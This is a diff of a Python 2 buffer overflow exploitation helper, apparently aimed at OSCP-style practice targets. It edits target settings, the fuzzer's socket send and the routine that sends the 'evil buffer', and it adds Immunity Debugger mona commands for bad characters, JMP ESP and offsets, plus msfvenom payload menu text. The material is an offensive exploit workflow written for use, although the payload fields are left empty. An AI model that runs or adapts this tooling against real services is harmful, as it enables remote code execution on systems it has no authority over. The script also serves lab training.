@@ -6,16 +6,16 @@ from colorama import Fore, Back, Style
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 # Settings (Please Update)
-IP = "192.168.0.143"
-PORT = 1337
-PREFIX = "OVERFLOW1 "
+IP = "10.10.10.10"
+PORT = 9999
+PREFIX = ""
 OFFSET = 0
 OVERFLOW = "A" * OFFSET
 RETN = ""
+# Padding "\x90" * 16 @ "\x90" * 32
 PADDING = ""
 POSTFIX = ""
 PAYLOAD =  ""
-
 
 # Header
 def header():
@@ -64,7 +64,7 @@ def fuzzer_option():
 			connect = s.connect((IP, PORT))
 			s.recv(1024)
 			print("Fuzzing with %s bytes" % len(string))
-			s.send("OVERFLOW1  " + string + "\r\n")
+			s.send(PREFIX + string + "\r\n")
 			s.recv(1024)
 			s.close()
 
@@ -89,11 +89,14 @@ def badchar_option():
 	print resultformat("\n[+] Bad Character => " + INPUTS)
 	print resultformat("[+] Original Length => 1020")
 	print resultformat("[+] Current Length => " + str(len(LISTBADCHAR)) + "\n")
-	print "Bad Character To Copy:\n"
+	print resultformat("!mona bytearray -b \'\\x" + "00\'")
+	print resultformat("!mona jmp -r esp -cpb \'\\x" + "00\'")
+	print "\nBad Character To Copy:\n"
 	print LISTBADCHAR
 
 # Exploit Option
 def exploit_option():
+	print resultformat("!mona compare -f C:\mona\oscp\\bytearray.bin -a <ESP>")
 	check()
 	INPUTS = raw_input("Confirm To Exploit? (Y = Yes ,N = No) : ")
 	if INPUTS == 'Y':
@@ -103,7 +106,7 @@ def exploit_option():
 		try :
 			    s.connect((IP, PORT))
 			    print("Sending evil buffer...")
-			    s.send(BUFFER + "\r\n\r\n")
+			    s.send(BUFFER + "\r\n")
 			    print("Done!")
 
 		except:
@@ -161,6 +164,7 @@ def pcreate():
 	CMD = "msf-pattern_create -l " + PATTERN
 	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 	RESULT = PS.communicate()[0]
+	print resultformat("\n!mona findmsp -distance " + str(PATTERN))
 	print headercolor("\n" + RESULT)
 	
 # Check Pattern Offset
@@ -174,7 +178,7 @@ def poffset():
 	
 # Msvenom Payload
 def payload():
-	print formatHelp("(+) Options => \n\t0 - Linux\n\t1 - Windows\n")
+	print formatHelp("(+) Options (Target Machine) => \n\t0 - Linux\n\t1 - Windows\n")
 	OPTIONS = ""
 	while (OPTIONS != "0") and (OPTIONS != '1'):
 		OPTIONS = str(raw_input("Enter Options: "))
